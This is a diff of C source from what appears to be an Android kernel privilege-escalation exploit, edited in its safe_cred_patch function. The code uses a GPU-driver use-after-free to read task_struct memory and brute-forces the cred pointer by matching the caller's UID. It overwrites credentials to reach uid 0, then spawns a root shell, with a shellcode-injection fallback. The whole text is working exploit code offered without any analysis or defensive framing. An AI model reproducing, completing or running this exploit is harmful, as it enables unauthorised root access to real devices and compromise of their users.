@@ -1145,9 +1145,8 @@ static void safe_cred_patch(void)
     uid_t my_uid = getuid();
 
     fprintf(stderr, "[CHILD] ============================================\n");
-    fprintf(stderr, "[CHILD] Starting SHELLCODE INJECTION via UAF\n");
+    fprintf(stderr, "[CHILD] Starting CRED PATCH via UAF\n");
     fprintf(stderr, "[CHILD] task_va from gbuf[0xb08]: 0x%lx\n", (unsigned long)task_va);
-    fprintf(stderr, "[CHILD] g_uaf_mmap_ptr = %p\n", g_uaf_mmap_ptr);
 
     if (task_va == 0) {
         fprintf(stderr, "[CHILD] [!] No task_va in gbuf\n");
@@ -1171,20 +1170,17 @@ static void safe_cred_patch(void)
         fprintf(stderr, "[CHILD] Kernel base: 0x%lx\n", (unsigned long)kernel_base);
     }
 
-    // Read 8KB around task_va to handle cross-page task_struct
+    // Centering 8KB buffer around the marker (task_va)
     uint8_t *big_task_data = malloc(8192);
-    uint64_t base_va = task_va & ~(uint64_t)0xFFF;
-    if (task_va - base_va < 0x500) {
-        // Marker is at the beginning of the page, task_struct likely starts in the previous page
-        base_va -= 4096;
-    }
-
-    fprintf(stderr, "[CHILD] Reading 8KB from 0x%lx for analysis...\n", (unsigned long)base_va);
-    if (gpu_read_task_struct(fd, base_va, big_task_data, 4096) == 0 &&
-        gpu_read_task_struct(fd, base_va + 4096, big_task_data + 4096, 4096) == 0) 
+    uint64_t read_base = (task_va & ~0xFFFULL) - 4096; // Read 2 pages: [prev, current]
+    
+    fprintf(stderr, "[CHILD] Reading 8KB around marker (base: 0x%lx)...\n", (unsigned long)read_base);
+    if (gpu_read_task_struct(fd, read_base, big_task_data, 4096) == 0 &&
+        gpu_read_task_struct(fd, read_base + 4096, big_task_data + 4096, 4096) == 0) 
     {
-        uint64_t cred_ptr = 0, real_cred_ptr = 0;
+        uint64_t cred_ptr = 0;
         int comm_off = -1;
+        // Search for marker in the 8KB buffer
         for (int i = 0; i < 8192 - 8; i++) {
             if (memcmp(big_task_data + i, MARKER_NAME, 8) == 0) {
                 comm_off = i;
@@ -1192,76 +1188,70 @@ static void safe_cred_patch(void)
             }
         }
         
-    if (comm_off != -1) {
-        if (find_cred_pointers_near_comm(fd, task_va, big_task_data, 8192, comm_off, &cred_ptr, &real_cred_ptr)) {
-            fprintf(stderr, "[CHILD] Dynamic search FOUND cred_ptr=0x%lx\n", (unsigned long)cred_ptr);
-        }
-        
-        if (cred_ptr == 0) {
-            // More aggressive search in the 8KB buffer
-            fprintf(stderr, "[CHILD] Searching for cred_ptr with ANY valid kernel pointer...\n");
-            for (int off = comm_off - 1024; off < comm_off + 1024; off += 8) {
+        if (comm_off != -1) {
+            fprintf(stderr, "[CHILD] Marker confirmed at buffer offset 0x%x\n", comm_off);
+            
+            // Search for cred_ptr in a 1.5KB window around comm
+            fprintf(stderr, "[CHILD] Searching for cred_ptr (target UID %d)...\n", my_uid);
+            for (int off = comm_off - 1024; off < comm_off + 256; off += 8) {
                 if (off < 0 || off > 8192 - 8) continue;
                 uint64_t ptr = *(uint64_t *)(big_task_data + off);
                 if ((ptr & 0xffffff0000000000ULL) == 0xffffff0000000000ULL) {
-                    // This is a kernel pointer. Could it be cred?
                     uint8_t cred_check[64];
                     if (gpu_read_task_struct(fd, ptr, cred_check, 64) == 0) {
                         uint32_t usage = *(uint32_t *)(cred_check + 0x00);
                         uint32_t uid = *(uint32_t *)(cred_check + 0x04);
-                        if (usage > 0 && usage < 1000 && uid == my_uid) {
+                        if (usage > 0 && usage < 2000 && uid == my_uid) {
                             cred_ptr = ptr;
-                            fprintf(stderr, "[CHILD] Found cred_ptr 0x%lx at off 0x%x via brute force!\n", 
-                                    (unsigned long)cred_ptr, off);
+                            fprintf(stderr, "[CHILD] FOUND CRED! ptr=0x%lx at off 0x%x\n", (unsigned long)cred_ptr, off);
                             break;
                         }
                     }
                 }
             }
         }
-    }
-    
-    if (cred_ptr == 0) {
-        // Fallback to hardcoded relative to comm
-        if (comm_off != -1) {
-            // Try standard offsets
-            uint64_t standard_cred_off = comm_off - (0x818 - 0x6b0);
-            if (standard_cred_off > 0 && standard_cred_off < 8192 - 8) {
-                cred_ptr = *(uint64_t *)(big_task_data + standard_cred_off);
-                fprintf(stderr, "[CHILD] Using standard relative offset -> cred_ptr=0x%lx\n", 
-                        (unsigned long)cred_ptr);
-            }
-        }
-    }
 
-        if (cred_ptr != 0 && (cred_ptr & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
-            if (patch_cred_via_gpu(fd, cred_ptr, real_cred_ptr) == 0) {
-                fprintf(stderr, "[CHILD] [+] Cred patch SUCCESSFUL via GPU!\n");
+        if (cred_ptr != 0) {
+            patch_cred_via_gpu(fd, cred_ptr, cred_ptr);
+            // Check if UID changed
+            if (getuid() == 0) {
+                fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT (uid=0)\n");
                 patched = 1;
+            } else {
+                // Try setuid(0) just in case
+                setuid(0);
+                if (getuid() == 0) {
+                    fprintf(stderr, "[CHILD] [+] SUCCESS! I AM ROOT after setuid(0)\n");
+                    patched = 1;
+                }
             }
+        } else {
+            fprintf(stderr, "[CHILD] [!] Failed to find cred_ptr in 8KB window.\n");
         }
     }
     free(big_task_data);
 
-    if (!patched) {
-        fprintf(stderr, "[CHILD] Step 3: Falling back to shellcode injection...\n");
-        uint64_t shellcode_va = task_va & ~(uint64_t)(PAGE_SIZE - 1);
-        shellcode_va += 0x1000;
+    if (patched) {
+        fprintf(stderr, "[CHILD] [+] Spawning root shell...\n");
+        system("/system/bin/sh");
+        exit(0);
+    }
 
-        if (inject_shellcode_to_uaf(fd, shellcode_va, shellcode, shellcode_len) == 0) {
-            fprintf(stderr, "[CHILD] [+] Shellcode injected at VA 0x%lx\n", (unsigned long)shellcode_va);
-            patched = 1;
-            gb_target_addr = shellcode_va;
-            g_shellcode_va = shellcode_va;
-            *(uint64_t *)&gbuf[GBUF_LIB_BASE] = shellcode_va;
-            gbuf[GBUF_TASK_SPRAY] = 0x2;
-            fprintf(stderr, "[CHILD] [+] Shellcode injection SUCCESS!\n");
-        } else {
-            fprintf(stderr, "[CHILD] [!] Shellcode injection FAILED\n");
-            gbuf[GBUF_TASK_SPRAY] = 0x1;
-        }
-    } else {
+    fprintf(stderr, "[CHILD] Step 3: Falling back to shellcode injection...\n");
+    uint64_t shellcode_va = task_va & ~(uint64_t)(PAGE_SIZE - 1);
+    shellcode_va += 0x1000;
+
+    if (inject_shellcode_to_uaf(fd, shellcode_va, shellcode, shellcode_len) == 0) {
+        fprintf(stderr, "[CHILD] [+] Shellcode injected at VA 0x%lx\n", (unsigned long)shellcode_va);
+        patched = 1;
+        gb_target_addr = shellcode_va;
+        g_shellcode_va = shellcode_va;
+        *(uint64_t *)&gbuf[GBUF_LIB_BASE] = shellcode_va;
         gbuf[GBUF_TASK_SPRAY] = 0x2;
+        fprintf(stderr, "[CHILD] [+] Shellcode injection SUCCESS!\n");
+    } else {
+        fprintf(stderr, "[CHILD] [!] Shellcode injection FAILED\n");
+        gbuf[GBUF_TASK_SPRAY] = 0x1;
     }
 }
 
